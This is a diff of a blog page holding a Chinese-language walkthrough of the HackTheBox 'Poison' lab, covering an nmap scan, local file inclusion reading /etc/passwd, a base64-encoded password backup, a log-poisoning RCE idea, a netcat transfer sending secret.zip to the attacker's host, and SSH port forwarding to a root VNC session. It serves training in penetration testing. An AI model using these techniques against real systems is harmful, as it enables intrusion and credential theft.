@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;132  10.10.10.84   端口扫描22和80: 1234567891011121314151617$ nmap -sC -sV 10.10.10.84Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-01-05 13:40 CSTNma">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;132  10.10.10.84                                                                                                              端口扫描22和80: 1234567891">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Poison - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2020/02/10/Poison-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;132  10.10.10.84   端口扫描22和80: 1234567891011121314151617$ nmap -sC -sV 10.10.10.84Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-01-05 13:40 CSTNma">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;132  10.10.10.84                                                                                                              端口扫描22和80: 1234567891">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010509.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010510.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010511.jpg">
@@ -130,7 +130,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -220,40 +220,124 @@
 </li>
 <li><h2 id="10-10-10-84"><a href="#10-10-10-84" class="headerlink" title="10.10.10.84"></a>10.10.10.84</h2></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010509.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010509.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.10.84</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-05 13:40 CST</span><br><span class="line">Nmap scan report for 10.10.10.84</span><br><span class="line">Host is up (0.068s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)</span><br><span class="line">|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)</span><br><span class="line">|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html; charset=UTF-8).</span><br><span class="line">Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 30.56 seconds</span><br></pre></td></tr></table></figure>
 
 <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>是一个测试本地php文件的site：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010510.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010510.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>有个listfiles用来列出文件，得到pwdbackup.txt：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010511.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010512.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010511.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010512.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h2><p>很基础的lfi，读取passwd得到用户名，后面要用：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010514.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010514.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="pwdbackup-txt"><a href="#pwdbackup-txt" class="headerlink" title="pwdbackup.txt"></a>pwdbackup.txt</h2><p>这特喵的13次base64，解出来一个密码：Charix!2#4%6&amp;8(0</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010513.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010513.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This password is secure, it&#39;s encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo&#x3D;</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>然后直接ssh登录charix，得到user.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010515.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010515.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="lfi-to-rce"><a href="#lfi-to-rce" class="headerlink" title="lfi to rce"></a>lfi to rce</h2><p>也可以通过前面的lfi去包含/var/log/httpd-access.log，然后UA里写php代码构造RCE，不过这样打到的是www，还是一样需要解出来密码切换到charix</p>
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><h2 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h2><p>用户目录有个secret.zip,下载下来：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4445 &gt; secret.zip</span><br><span class="line">nc 10.10.14.18 4445 &lt; secret.zip</span><br></pre></td></tr></table></figure>
 
 <p>zip解压需要密码，就是charix的密码Charix!2#4%6&amp;8(0 ：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010516.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010516.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>得到一个secret文件，先放着：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010517.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010517.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="vnc"><a href="#vnc" class="headerlink" title="vnc"></a>vnc</h2><p>查看端口发现本地开着5801，5901:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010518.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010518.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>这是vnc相关端口，查看进程也能看到是root用户启动的vnc服务：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010519.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010519.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>那么前面的secret应该就是vnc用的了，转发端口出来vnc访问</p>
 <h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p>就是把端口转发出来，然后vnc指定密码文件访问，得到root.txt：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 10.211.55.2:5901:127.0.0.1:5901 charix@10.10.10.84</span><br><span class="line"></span><br><span class="line">vncviewer 10.211.55.2::5901 -passwd secret</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010520.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010520.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li><a href="https://www.hackthebox.eu/home/machines/writeup/132" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/writeup/132</a></li>
 <li>HackTheBox - Poison - YouTube<br><a href="https://www.youtube.com/watch?v=rs4zEwONzzk&amp;feature=emb_title&amp;ab_channel=IppSec" target="_blank" rel="noopener">https://www.youtube.com/watch?v=rs4zEwONzzk&amp;feature=emb_title&amp;ab_channel=IppSec</a></li>
